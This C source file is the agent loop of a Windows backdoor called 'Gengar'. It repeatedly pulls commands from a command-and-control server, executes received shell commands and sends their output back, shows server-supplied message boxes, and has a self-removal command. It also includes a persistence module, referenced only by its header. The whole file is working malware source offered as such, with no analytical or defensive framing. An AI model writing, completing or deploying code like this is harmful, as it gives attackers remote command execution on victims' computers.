#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "client.h"
#include "persistance.h"
#include "shell.h"

#define CMDTYPE_BUFSIZE 1
#define MSGBOX_BUFSIZE 128
#define SHELL_BUFSIZE 4096

enum cmd_types { shell, msgbox, suicide };

void handle_shell() {
  char *cmd, *out;
  cmd = recv_from_cnc(SHELL_BUFSIZE);
  printf("Executing shell command: %s\n", cmd);
  out = run(cmd);
  free(cmd);
  send_to_cnc(out);
  free(out);
}

void handle_msgbox() {
  char *msg;
  msg = recv_from_cnc(MSGBOX_BUFSIZE);
  printf("Popping MessageBox: %s\n", msg);
  MessageBox(NULL, msg, "Gengar Says", 0);
  free(msg);
}

void start_agent() {
  char *res;

  while (1) {
    res = recv_from_cnc(CMDTYPE_BUFSIZE);
    enum cmd_types cmd_type = res[0];
    free(res);

    switch (cmd_type) {
      case shell:
        handle_shell();
        break;
      case msgbox:
        handle_msgbox();
        break;
      case suicide:
        kill_gengar();
        break;
    }
  }
}
